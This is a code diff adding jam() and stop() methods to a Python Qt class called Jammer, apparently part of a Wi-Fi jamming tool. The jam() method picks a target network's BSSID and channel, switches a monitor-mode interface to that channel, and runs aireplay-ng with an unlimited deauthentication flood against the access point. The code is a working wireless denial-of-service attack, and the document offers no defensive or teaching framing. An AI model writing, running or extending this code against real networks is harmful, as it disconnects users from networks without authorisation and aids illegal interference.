@@ -58,6 +58,27 @@ class Jammer(QObject):
         print(self.essid[1:])
         return [item.strip() for item in self.essid[1:]]
 
+    @Slot(int)
+    def jam(self, wifiIndex):
+        wifiIndex = wifiIndex + 1
+        print(wifiIndex)
+        print(self.essid[wifiIndex])
+        current_essid_index = wifiIndex
+        self.retrive_info(0)
+        current_bssid = self.bssid[current_essid_index]
+        self.retrive_info(3)
+        current_channel = self.channel[current_essid_index]
+        subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
+        self.process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
+        wifiIndex = 0
+
+    @Slot()
+    def stop(self):
+        self.process.terminate()
+        subprocess.run(['pkill', 'aireplay-ng'])
+        os.system('clear')
+
+    #Helper Function
     def retrive_info(self, index):
 
         self.essid = []
